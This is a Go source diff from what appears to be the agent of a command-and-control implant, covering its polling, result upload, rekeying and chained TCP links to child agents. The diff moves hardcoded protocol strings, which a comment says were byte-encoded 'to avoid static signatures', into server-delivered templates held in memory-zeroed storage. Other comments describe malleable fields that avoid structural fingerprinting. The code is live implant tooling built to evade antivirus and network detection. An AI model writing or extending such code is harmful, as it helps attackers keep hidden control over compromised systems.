@@ -23,18 +23,49 @@ import (
 	"time"
 )
 
-// Polling strings (constructed to avoid static signatures)
-var (
-	pollContentTypeJson   = string([]byte{0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x6a, 0x73, 0x6f, 0x6e})                                                       // application/json
-	pollStatusKey         = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                                                                                   // status
-	pollCmdRekey          = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79})                                                                                                                         // rekey
-	pollStatusNoCommands  = string([]byte{0x6e, 0x6f, 0x5f, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x73})                                                                                     // no_commands
-	pollKeyAgentID        = string([]byte{0x61, 0x67, 0x65, 0x6e, 0x74, 0x5f, 0x69, 0x64})                                                                                                       // agent_id
-	pollKeyResults        = string([]byte{0x72, 0x65, 0x73, 0x75, 0x6c, 0x74, 0x73})                                                                                                             // results
-	pollMsgType           = string([]byte{0x74, 0x79, 0x70, 0x65})                                                                                                                               // type
-	pollMsgPayload        = string([]byte{0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64})                                                                                                             // payload
-	pollTypeHandshakeResp = string([]byte{0x68, 0x61, 0x6e, 0x64, 0x73, 0x68, 0x61, 0x6b, 0x65, 0x5f, 0x72, 0x65, 0x73, 0x70, 0x6f, 0x6e, 0x73, 0x65})                                           // handshake_response
+// CommsTemplate stores communications-related template strings received from server
+type CommsTemplate struct {
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`
+	Templates []string `json:"tpl"`
+	Params    []string `json:"p"`
+}
+
+// Comms template indices - must match server's common.go
+const (
+	// HTTP headers (710-716)
+	idxCommsUserAgent   = 710
+	idxCommsContentType = 711
+	idxCommsPadPre      = 712
+	idxCommsPadApp      = 713
+	idxCommsMetaId      = 714
+	idxCommsEncryption  = 715
+	idxCommsEncRsaAes   = 716
+
+	// Polling protocol (720-728)
+	idxPollAppJson       = 720
+	idxPollStatus        = 721
+	idxPollRekey         = 722
+	idxPollNoCommands    = 723
+	idxPollAgentId       = 724
+	idxPollResults       = 725
+	idxPollType          = 726
+	idxPollPayload       = 727
+	idxPollHandshakeResp = 728
 )
+
+// Global comms template storage (uses SecureTemplate for memory zeroing)
+var globalCommsTpl *SecureTemplate
+
+// commsTpl safely retrieves a template string by index
+func commsTpl(idx int) string {
+	return globalCommsTpl.Get(idx)
+}
+
+// getPollStr gets polling string from template (no fallbacks - templates sent during handshake)
+func getPollStr(idx int) string {
+	return commsTpl(idx)
+}
 
 // Malleable field values - injected at build time via ldflags
 // These can be customized in config.toml to avoid structural fingerprinting
@@ -118,7 +149,7 @@ func tryDecryptResponse(rawResponse map[string]interface{}, xorKey []byte) (map[
 		}
 
 		// Check if it has expected fields (status is required)
-		if _, hasStatus := response[pollStatusKey]; hasStatus {
+		if _, hasStatus := response[getPollStr(idxPollStatus)]; hasStatus {
 			return response, nil
 		}
 	}
@@ -206,7 +237,7 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 			req.Header.Set(httpHeaderContentType, contentType)
 		}
 	} else {
-		req.Header.Set(httpHeaderContentType, pollContentTypeJson)
+		req.Header.Set(httpHeaderContentType, getPollStr(idxPollAppJson))
 	}
 
 	req.Header.Set(httpHeaderUserAgent, decryptedValues.UserAgent)
@@ -453,7 +484,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		// Create result for the rekey command first (before triggering rekey)
 		rekeyResult := &CommandResult{
 			Command: Command{
-				Command:     pollCmdRekey,
+				Command:     getPollStr(idxPollRekey),
 				CommandDBID: commandDBID,
 				AgentID:     clientID,
 			},
@@ -512,7 +543,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	}
 
 	// Check for no commands
-	if responseStatus == pollStatusNoCommands {
+	if responseStatus == getPollStr(idxPollNoCommands) {
 		return nil
 	}
 
@@ -556,7 +587,7 @@ func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]st
 
 	// Build payload with only link data
 	payload := make(map[string]interface{})
-	payload[pollKeyAgentID] = clientID
+	payload[getPollStr(idxPollAgentId)] = clientID
 	payload[MALLEABLE_LINK_DATA_FIELD] = ConvertLinkDataToMaps(linkData)
 
 	jsonData, err := json.Marshal(payload)
@@ -681,9 +712,9 @@ func processLinkHandshakeResponses(responses []interface{}) {
 		// Send handshake response to TCP agent
 		// Include the lr array for forwarding to grandchildren (TCP chains)
 		message := map[string]interface{}{
-			pollMsgType:                         pollTypeHandshakeResp,
-			pollMsgPayload:                      payload,
-			MALLEABLE_LINK_HANDSHAKE_RESP_FIELD: []interface{}{respMap}, // Include for forwarding to grandchildren
+			getPollStr(idxPollType):       getPollStr(idxPollHandshakeResp),
+			getPollStr(idxPollPayload): payload,
+			MALLEABLE_LINK_HANDSHAKE_RESP_FIELD:        []interface{}{respMap}, // Include for forwarding to grandchildren
 		}
 
 		data, err := json.Marshal(message)
@@ -797,10 +828,10 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 			if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications {
 				results := resultManager.GetPendingResults()
 				payload := make(map[string]interface{})
-				payload[pollKeyAgentID] = clientID
+				payload[getPollStr(idxPollAgentId)] = clientID
 
 				if len(results) > 0 {
-					payload[pollKeyResults] = results
+					payload[getPollStr(idxPollResults)] = results
 				}
 				if hasLinkData {
 					payload[MALLEABLE_LINK_DATA_FIELD] = ConvertLinkDataToMaps(linkData)
